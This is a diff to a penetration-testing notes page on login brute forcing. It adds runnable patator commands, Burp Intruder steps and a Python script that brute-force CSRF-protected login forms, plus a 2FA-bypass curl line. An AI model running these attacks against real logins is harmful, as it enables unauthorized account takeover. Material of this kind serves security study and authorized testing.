@@ -1,6 +1,6 @@
 # Login Brute Forcing
 
-#bruteforce #auth #authentication #hydra #medusa #passwords #PasswordSpraying #2FABypass #MFA #kerbrute #netexec #ffuf #UsernameEnumeration
+#bruteforce #auth #authentication #hydra #medusa #patator #passwords #PasswordSpraying #2FABypass #MFA #kerbrute #netexec #ffuf #UsernameEnumeration #CSRF
 
 ## What is this?
 
@@ -14,6 +14,7 @@ Automated credential testing against authentication interfaces. Covers Hydra and
 |---|---|
 | [[Tools/Auth/Hydra\|Hydra]] | Multi-protocol online brute forcer — SSH, FTP, SMB, RDP, HTTP |
 | [[Tools/Auth/Medusa\|Medusa]] | Multi-threaded parallel brute forcer |
+| [[Tools/Auth/patator\|patator]] | Fine-grained brute forcer — the tool for **CSRF-token** forms (fetch+scrape per request) where Hydra/Medusa can't |
 | [[Tools/Lateral Movement/NetExec\|netexec]] / [[Tools/Lateral Movement/crackmapexec\|CrackMapExec]] | SMB/AD password spraying with lockout tracking |
 | [[Tools/Scanning/ffuf\|ffuf]] | HTTP form brute force + username enumeration |
 | [[Tools/Web/Burpsuite\|Burp Intruder]] | GUI credential stuffing and form fuzzing |
@@ -309,6 +310,35 @@ Common defaults to try manually:
 
 ## Web Application Notes
 
+### CSRF-Protected / Dynamic-Token Login Forms (where Hydra & Medusa fail)
+
+If the login form carries a **per-request hidden token** (`_token` Laravel, `csrfmiddlewaretoken` Django, `authenticity_token` Rails, `__RequestVerificationToken` ASP.NET) that changes on every page load, **Hydra and Medusa cannot brute it** — they replay a fixed body with a stale (or missing) token, so *every* attempt fails with a token error that is **indistinguishable from a wrong password**. Same trap as a stale CSRF token blinding sqlmap. Detect it: GET the login page twice and diff the hidden field — if it changes, you need a stateful tool.
+
+**Fix 1 — patator** (fetch a fresh token per request, carry the cookie):
+```bash
+patator http_fuzz url=http://t/login method=POST \
+  body='_token=_CSRF_&email=admin@x&password=FILE0' \
+  before_urls=http://t/login before_egrep='_CSRF_:name="_token" value="([^"]+)"' \
+  accept_cookie=1 0=passwords.txt -x ignore:fgrep='Invalid'
+```
+(full flow: [[Tools/Auth/patator|patator]] → *HTTP Form (POST)*.)
+
+**Fix 2 — Burp Intruder**: **Pitchfork** with a **Recursive Grep** payload that extracts the token from the previous response, plus a session-handling **macro** to pull a fresh token+cookie before each request.
+
+**Fix 3 — a tiny stateful script** (the most reliable; a `requests.Session()` keeps cookies and you scrape the token each loop):
+```python
+import requests, re
+s = requests.Session(); URL = "http://t/login"
+for pw in map(str.strip, open("passwords.txt")):
+    tok = re.search(r'name="_token" value="([^"]+)"', s.get(URL).text).group(1)
+    r = s.post(URL, data={"_token": tok, "email": "admin@x", "password": pw},
+               allow_redirects=False)
+    if r.status_code == 302:                 # success signal — CALIBRATE this first
+        print("[+]", pw); break
+```
+
+> [!warning] A rotating **session cookie** usually accompanies the rotating token — the token is bound to the session, so you must carry the `Set-Cookie` forward on every request (patator `accept_cookie=1`, a `requests.Session()`, or a Burp macro). Drop the cookie and even a freshly-scraped token is rejected.
+
 ### Identifying Login Failure String
 
 Intercept with Burp or curl to get the failure response, then use that string as the failure indicator in Hydra/Medusa:
@@ -457,10 +487,15 @@ ffuf -w otp.txt -X POST -d "otp=FUZZ" -H "Cookie: session=<sess>" -u http://<tar
 # 2FA logic bypass — try BEFORE brute forcing: send final step with NO otp field
 curl -s -X POST http://<target>/verify-otp -H "Cookie: session=<post-pw-sess>" -d ""
 # Also: replay a used code, force response true/302, request post-2FA URL directly
+
+# CSRF-token login form (Hydra/Medusa CAN'T) — patator fetches+scrapes the token per request
+patator http_fuzz url=http://<target>/login method=POST body='_token=_C_&email=admin@x&password=FILE0' \
+  before_urls=http://<target>/login before_egrep='_C_:name="_token" value="([^"]+)"' accept_cookie=1 \
+  0=passwords.txt -x ignore:fgrep='Invalid'
 ```
 
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-07-31*
+*Updated: 2026-09-01*
 *Model: claude-opus-5*
